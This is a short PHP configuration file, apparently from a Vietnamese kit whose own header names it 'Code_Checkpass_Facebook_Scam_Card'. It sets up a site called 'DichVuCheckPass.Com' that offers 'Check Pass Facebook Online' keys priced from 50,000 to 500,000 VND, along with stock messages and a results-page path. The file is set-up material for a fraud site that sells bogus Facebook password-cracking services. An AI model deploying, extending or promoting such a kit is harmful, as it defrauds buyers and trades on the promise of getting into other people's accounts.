<?php
/* <!--
- Source : Code_Checkpass_Facebook_Scam_Card (v3.0)
- (If there is a new update, please go to Dat Coder youtube channel)
- Author : Nguyễn Tấn Dạt
- Theme : Võ Hữu Nhân
- Contact :
+ Mail :ndat0762@gmail.com
+ Zalo : 0779817989
+ Youtube : Đạt Coder
================ XÓA COPYRIGHT LÀ SÚC VẬT :D ================
--> */
$bi_main_url = "http://Shopdatmcgm.com";
$bi_main_domain = "DichVuCheckPass.Com";
$bi_domain_nav = "<i class='fa fa-cube' aria-hidden='true'></i> DichVuCheckPass<b>.Com</b>";
$bi_title = $bi_main_domain." - Check Pass Facebook Online";
$bi_time = time();
#=============== GIÁ =======================================
$key1 = "50.000 VND";
$key2 = "100.000 VND";
$key3 = "200.000 VND";
$key4 = "300.000 VND";
$key5 = "500.000 VND";
$key6 = "<strike>1.000.000</strike> GIẢM GIÁ CÒN 500.000 VND";
#=============== INFO KEY ==================================
$infokey1 = "<font color='red'>Hết key</font>";
$infokey2 = "Còn key";
#=============== CONNECT ===================================
$bi_success = "/@Bi_Result/success.php";  
$bi_curl_success = "file_get_contents($bi_success)";
?>